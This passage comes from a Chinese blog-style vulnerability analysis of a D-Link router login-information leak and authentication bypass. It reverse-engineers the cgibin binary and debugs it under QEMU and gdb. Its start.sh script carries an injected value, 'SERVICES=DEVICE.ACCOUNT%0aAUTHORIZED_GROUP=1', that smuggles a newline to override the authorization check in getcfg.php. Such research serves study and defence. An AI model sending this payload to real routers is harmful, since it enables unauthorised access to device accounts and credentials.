class="line">htdocs/web/getcfg.php:<span class="keyword">if</span>($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/diagnostic.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/ddns_act.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/log_get.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP==<span class="number">0</span>)</span><br><span class="line">htdocs/web/sitesurvey.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/wpsacts.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/web/check.php:<span class="keyword">if</span> ($AUTHORIZED_GROUP &lt; <span class="number">0</span>)</span><br><span class="line">htdocs/cgibin:&lt;AUTHORIZED_GROUP&gt;%d&lt;/AUTHORIZED_GROUP&gt;</span><br><span class="line">htdocs/cgibin:application/audio/example/image/message/model/multipart/text/video/read_ct_videoread_ct_textread_ct_multipartread_ct_modelread_ct_messageread_ct_imageread_ct_exampleread_ct_audioread_ct_applicationSystem rebootUpgrade firmware successFail to write file!Image file is not acceptable. Please check download version is rightFail to get the file, please check the IP address and check the file name::ffff:Web login success from %sWeb login failure from %sWeb logout from %s_POST__FILES_N/A_FILETYPES__GET__SERVER_REQUEST_METHODHEADGETPOST/htdocs/web/info.php/info.phpFAILERR_REQ_TOO_LONGunsupported HTTP requestAUTHORIZED_GROUP=%dSESSION_UID=sobj_new() error!ERR_NO_FILEr+ERR_FOPEN_FAILsignature=_aLpHaERR_INVALID_SEAMAERR_SEAMA_META_TOO_LARGEERR_SEAMA_CHECKSUM_ERRERR_SEAMA_META_ERRnoheader=<span class="number">1</span>type=type=firmwaretype=devconfdev=/dev/mtdblock/<span class="number">2</span>/var/config.xml.gzdevconf put -f /var/config.xml.gz%lu/var/session/configsize/var/firmware.seama/var/session/imagesizeERR_INVALID_FILE/etc/config/image_signPELOTA_REPORT/dlcfg.cgiREPORT_METHODhttp:<span class="comment">//HTTP_HOSTSERVER_PORT80HTTP_REFERERDELAYERR_UNAUTHORIZED_SESSIONERR_READ_SIGN_FAILSUCCESS/var/run/fwseama.lockpreupdate:%d:event PREFWUPDATEERR_ANOTHER_FWUP_PROGRESS/etc/scripts/dlcfg_hlper.sh/htdocs/web/docs/config.binHTTContent-Disposition: attachment; filename=&quot;%s&quot;</span></span><br></pre></td></tr></table></figure><p>从这里可以看到有两个可以给 <code>$AUTHORIZED_GROUP</code> 赋值的地方，一个是在 <code>/htdocs/web/wiz_freset.php</code>，另一个是在 <code>/htdocs/cgibin</code> 本文我们利用的是 <code>cgibin</code></p><p>但是下面我们先来看看 <code>wiz_freset.php</code><br>通过这里的注释我们知道它是<code>用于出厂默认设置</code>时的，所以我们暂时不考虑<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/5.png"></p><p>因此，我们需要逆向分析<code>cgibin</code>文件，进入 <code>main函数</code> 中<br>由于这里的 <code>webserver</code> 运行的是<code>php</code>脚本，那么这个二进制文件中重点的就是处理 <code>php</code> 语言的部分，也就是<code>phpcgi</code>，我们进入 <code>phpcgi_main</code></p><p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/6.png"></p><p>进入 <code>phpcgi_main</code> 之后我们分析一下下面这几个函数<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/7.png"></p><p><code>sobj_new()</code> 的作用是创建一个结构体，用于存放之后程序解析出来的各个字段<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/8.png"></p><p><code>sobj_add_string(v7, *(a2 + 4));</code> 的作用就是将 <code>*(a2 + 4)</code> 存储的内容放入到 <code>v7</code> 这个结构体中</p><p>下面编写shell脚本来使用qemu进行动态调试<br>编写<code>start.sh</code>脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"><span class="meta"># sudo ./start.sh</span></span><br><span class="line"></span><br><span class="line">INPUT=$(python -c <span class="string">&quot;print(&#x27;SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1&#x27;)&quot;</span>)</span><br><span class="line">LEN=$(echo $INPUT | wc -c)</span><br><span class="line">PORT=<span class="string">&quot;1234&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$LEN&quot;</span> == <span class="string">&quot;0&quot;</span> ] || [ <span class="string">&quot;$INPUT&quot;</span> == <span class="string">&quot;-h&quot;</span> ] || [ <span class="string">&quot;$UID&quot;</span> != <span class="string">&quot;0&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">    echo -e <span class="string">&quot;\nusage: sudo $0\n&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> <span class="number">1</span></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">cp $(which qemu-mipsel-<span class="type">static</span>) ./qemu</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;$INPUT&quot;</span> | chroot . ./qemu <span class="number">-0</span> <span class="string">&quot;/phpcgi&quot;</span> \</span><br><span class="line">    -E CONTENT_LENGTH=$LEN \</span><br><span class="line">    -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> \</span><br><span class="line">    -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> \</span><br><span class="line">    -E REQUEST_URI=<span class="string">&quot;/getcfg.php&quot;</span> \</span><br><span class="line">    -E REMOTE_ADDR=<span class="string">&quot;127.0.0.1&quot;</span> \</span><br><span class="line">    -g $PORT ./htdocs/cgibin <span class="string">&quot;/phpcgi&quot;</span> <span class="string">&quot;/phpcgi&quot;</span>  # <span class="number">2</span>&gt;/dev/null</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;run ok&quot;</span></span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure><p>编写gdb脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mygdb.sh</span></span><br><span class="line"></span><br><span class="line">set architecture mips                                     </span><br><span class="line">set follow-fork-mode child  </span><br><span class="line">set detach-on-fork off                                    </span><br><span class="line">file ./htdocs/cgibin</span><br><span class="line">target remote 127.0.0.1:1234        </span><br></pre></td></tr></table></figure><p>下面分别执行即可进入gdb界面进行调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ./start.sh</span><br><span class="line">gdb-multiarch -x mygdb.sh</span><br></pre></td></tr></table></figure><p>下面我们进入调试，在 <code>sobj_add_string</code> 函数处打上一个断点随后跟进到此处，这样我们就可以看到这里的几个参数，而它的第二个参数也就是 <code>*(a2 + 4)</code> 显示为 <code>phpcgi</code> 这个字符串，也就是说着在开头的 <code>sobj_add_string(v7, *(a2 + 4));</code> 它将 <code>phpcgi</code> 这个字符串写入了 <code>v7</code> 这个结构体中<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/9.png"></p><p>下面继续，可以看到下面 <code>27行-32行</code> 有一个 <code>for循环</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = a3; *i; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  sobj_add_string(v6, <span class="string">&quot;_SERVER_&quot;</span>);</span><br><span class="line">  sobj_add_string(v6, *i);</span><br><span class="line">  sobj_add_char(v6, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们进入 <code>for循环</code>，看看变量 <code>v6</code> 的变化(下面是进入for循环但是还没有开始执行for循环的任何指令)<br>根据图中信息 <code>v6</code> 的地址应该为 <code>0x438008</code> </p><p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/10.png"></p><p>下面我们直接跳过 <code>for ( i = a3; *i; ++i )</code> 来看结果<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/11.png"></p><p>从上面这张图中我们可以看到参数是以键值对的形式存储并且以换行符 <code>\n</code> 分割</p><p>所以我们构造并传入一个 <code>AUTHORIZED_GROUP=1</code> 这样就可以在给 <code>AUTHORIZED_GROUP</code> 赋值的顶替掉程序原本想要赋值的值使用我们给的数据 <code>1</code> </p><p>下面我们来看 <code>33行-48行</code><br><code>v9</code> 获取了 <code>REQUEST_METHOD</code> 的值<br>随后判断是否使用 <code>HEAD</code> 或 <code>GET</code> 类型传参，如果是，则将 <code>sub_405CF8</code> 函数地址赋值给 <code>v11</code><br>如果使用的是 <code>POST</code>  传参那么就会将 <code>sub_405AC0</code> 函数地址赋值给 <code>v11</code><br>而显然我们使用的是 <code>POST</code> 传参方式，也就是说我们的 <code>v11</code> 是 <code>sub_405AC0</code> 函数地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  v9 = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  v10 = v9;</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  <span class="keyword">if</span> ( !strcasecmp(v9, <span class="string">&quot;HEAD&quot;</span>) || !strcasecmp(v10, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = sub_405CF8;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(v10, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_20:</span><br><span class="line">    v5 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = sub_405AC0;</span><br></pre></td></tr></table></figure><p>下面会进入到 <code>cgibin_parse_request</code> 函数中<br>这里获取了 <code>CONTENT_TYPE</code> 和 <code>CONTENT_LENGTH</code> 两个环境变量，所以我们的 <code>start.sh</code> 脚本中也需要设置对应的 <code>-E CONTENT_TYPE</code> 和 <code>-E CONTENT_LENGTH</code> 这里需要注意 <code>CONTENT_LENGTH</code> 得和我们输入的长度一致，否则可能发生错误<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/12.png"></p><p>再进入到 <code>parse_uri</code> ，可以看到开头获取了 <code>REQUEST_URI</code> 如果我们的 <code>start.sh</code> 脚本中没有设置 <code>-E REQUEST_URL</code><br>那么后续就会导致获取失败，从而导致程序异常退出<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/13.png"></p><p>继续往下看，我们将已知的变量修改一下名字，可以看到下面有一个 <code>strncasecmp</code> 要求让 <code>content_type</code> 和 <code>v14</code> 的相同才可以进入其中，否则则会执行 <code>return -1</code><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/14.png"></p><p>我们在 <code>strncasecmp</code> 处下断点看到这里的 <code>v14</code> 是 <code>application/</code><br>我们设置 <code>application/</code> 可以顺利通过这个判断，进入到下面的 <code>return</code> 部分<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/15.png"></p><p>通过调试我们可以知道这里函数调用的地址实际上就是 <code>0x40445c</code><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/16.png"></p><p>我们继续来看 <code>sub_40445c</code><br>这里又有一个判断 <code>a4</code> 是之前传入的 <code>&amp;content_type[v12]</code><br>到了这里实际上就是 <code>application/</code> 后面的部分，所以我们完整的 <code>CONTENT_TYPE</code> 需要设置为 <code>application/x-www-form-urlencoded</code><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/17.png"></p><p>继续跟进到 <code>sub_403A0C</code> 函数中，发现其中有一个 <code>read</code> 函数<br>之后我们 <code>POST</code> 的请求就是使用这个 <code>read</code> 来读入的<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/18.png"></p><p>再继续进入到 <code>sub_403864</code> 函数,此函数的作用如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_403864</span><span class="params">(_DWORD *a1, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// $s1 - 字符遍历索引</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0 - 临时变量</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $v1 - 临时变量</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v9)(<span class="type">int</span>, _DWORD *); <span class="comment">// $t9 - 回调函数指针</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0 - 回调函数参数</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0 - 函数返回值</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v1 - 当前字符值</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $a1 - 解码前字符</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// $a0 - 存储对象指针</span></span><br><span class="line">  <span class="type">char</span> *v15; <span class="comment">// $a1 - 当前字符指针</span></span><br><span class="line">  _DWORD v16[<span class="number">4</span>]; <span class="comment">// [sp+18h] [-10h] BYREF - 回调参数数组</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 第一部分：解析键值对数据</span></span><br><span class="line">  <span class="keyword">if</span> ( a2 )  <span class="comment">// 检查数据指针是否有效</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>; <span class="comment">// 初始化遍历索引</span></span><br><span class="line">    <span class="keyword">if</span> ( a3 ) <span class="comment">// 检查数据长度</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 循环终止条件：遍历完成</span></span><br><span class="line">        result = v6 &lt; a3;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt;= a3 )</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        </span><br><span class="line">        v15 = (a2 + v6);  <span class="comment">// 当前字符地址</span></span><br><span class="line">        v12 = *(a2 + v6); <span class="comment">// 获取当前字符值</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 状态机：0=解析键(key), 1=解析值(value)</span></span><br><span class="line">        <span class="keyword">if</span> ( *a1 ) <span class="comment">// 当前状态：解析值(value)</span></span><br><span class="line">        &#123;</span><br><span class="line">          v13 = *v15; <span class="comment">// 取字符原始值</span></span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 分隔符检测：&amp; 符号（键值对分隔符）</span></span><br><span class="line">          <span class="keyword">if</span> ( v12 == <span class="number">38</span> ) <span class="comment">// 38 是 &#x27;&amp;&#x27; 的 ASCII 值</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="comment">// 递归调用自身处理当前键值对</span></span><br><span class="line">            sub_403864(a1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_15; <span class="comment">// 跳过字符处理</span></span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 将字符添加到值缓冲区</span></span><br><span class="line">          v14 = a1[<span class="number">2</span>]; <span class="comment">// 获取值缓冲区对象指针</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">// 当前状态：解析键(key)</span></span><br><span class="line">        &#123;</span><br><span class="line">          v13 = *v15; <span class="comment">// 取字符原始值</span></span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 分隔符检测：= 符号（键值分隔符）</span></span><br><span class="line">          <span class="keyword">if</span> ( v12 == <span class="number">61</span> ) <span class="comment">// 61 是 &#x27;=&#x27; 的 ASCII 值</span></span><br><span class="line">          &#123;</span><br><span class="line">            *a1 = <span class="number">1</span>; <span class="comment">// 切换状态到值解析</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_15; <span class="comment">// 跳过字符处理</span></span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 将字符添加到键缓冲区</span></span><br><span class="line">          v14 = a1[<span class="number">1</span>]; <span class="comment">// 获取键缓冲区对象指针</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 核心操作：将当前字符添加到缓冲区</span></span><br><span class="line">        sobj_add_char(v14, v13); <span class="comment">// 字符串缓冲区追加字符</span></span><br><span class="line">        </span><br><span class="line">        LABEL_15:</span><br><span class="line">        ++v6; <span class="comment">// 移动到下一个字符</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 第二部分：键值对处理回调</span></span><br><span class="line">  <span class="keyword">if</span> ( *a1 ) <span class="comment">// 检查状态是否处于值解析中</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 检查键缓冲区是否有数据</span></span><br><span class="line">    <span class="keyword">if</span> ( !sobj_empty(a1[<span class="number">1</span>]) ) </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// URI解码：对键和值进行解码处理</span></span><br><span class="line">      sobj_unescape_uri(a1[<span class="number">1</span>]); <span class="comment">// 解码键</span></span><br><span class="line">      sobj_unescape_uri(a1[<span class="number">2</span>]); <span class="comment">// 解码值</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 准备回调函数参数</span></span><br><span class="line">      v7 = a1[<span class="number">1</span>]; <span class="comment">// 键字符串指针</span></span><br><span class="line">      v8 = a1[<span class="number">2</span>]; <span class="comment">// 值字符串指针</span></span><br><span class="line">      v9 = a1[<span class="number">3</span>]; <span class="comment">// 回调函数指针</span></span><br><span class="line">      v10 = a1[<span class="number">4</span>]; <span class="comment">// 用户上下文数据</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 构建回调参数数组</span></span><br><span class="line">      v16[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">// 保留位/标志位</span></span><br><span class="line">      v16[<span class="number">1</span>] = v7; <span class="comment">// 键</span></span><br><span class="line">      v16[<span class="number">2</span>] = v8; <span class="comment">// 值</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 执行回调：处理解析出的键值对</span></span><br><span class="line">      v9(v10, v16); <span class="comment">// 调用函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 第三部分：资源清理</span></span><br><span class="line">  sobj_free(a1[<span class="number">1</span>]);       <span class="comment">// 释放键缓冲区</span></span><br><span class="line">  result = sobj_free(a1[<span class="number">2</span>]); <span class="comment">// 释放值缓冲区</span></span><br><span class="line">  *a1 = <span class="number">0</span>;                <span class="comment">// 重置解析状态</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> result; <span class="comment">// 返回处理结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试后我们知道我们会进入到 <code>else分支</code> 然后会执行 <code>v9(v10, v16);</code> 由 <code>gdb</code> 调试可以知道，它是跳转到 <code>0x405ac0</code><br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/19.png"></p><p>那么我们进入到 <code>sub_405AC0</code> 函数<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/20.png"></p><p>重点在于我们的 <code>else分支</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  sobj_add_string(a1, <span class="string">&quot;_POST_&quot;</span>);</span><br><span class="line">  v5 = sobj_get_string(a2[<span class="number">1</span>]);</span><br><span class="line">  sobj_add_string(a1, v5);</span><br><span class="line">  sobj_add_char(a1, <span class="number">61</span>);</span><br><span class="line">  v6 = a2[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/21.png"></p><p>这里会按照 <code>POST</code> 请求对输入的内容进行解析，就是找到一个 <code>=</code> 再将前后分离并且拼接，然后将解析好的内容拼接到上面的字符串</p><p>随后我们回到 <code>phpcgi_main</code><br>下面会有一个 <code>sess_validate()</code> 函数<br>按照下面路径我们会发现程序会打开一个 <code>&quot;/var/session/sesscfg&quot;</code> 文件，而我们模拟的是没有的，我们只能将它 <code>patch</code> 掉</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sess_validate -&gt; sub_409504 -&gt; sub_4090B0</span><br></pre></td></tr></table></figure><p>也就是把 <code>phpcgi_main</code> 中 <code>v13 = sess_validate();</code> 这一行代码去掉<br>同时为了模拟真实情况，我们手动补上 <code>li $v0，-1</code> 使得原先的 <code>v12</code> 最后为 <code>-1</code></p><p>按照下方式修改<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/22.png"><br>修改后如下<br><img src="/../picture/D-Link%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2(%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A(CVE-2018-7034)/23.png"></p><p><code>patch</code> 之后我们使用保存修改并导出，然后替换掉我们 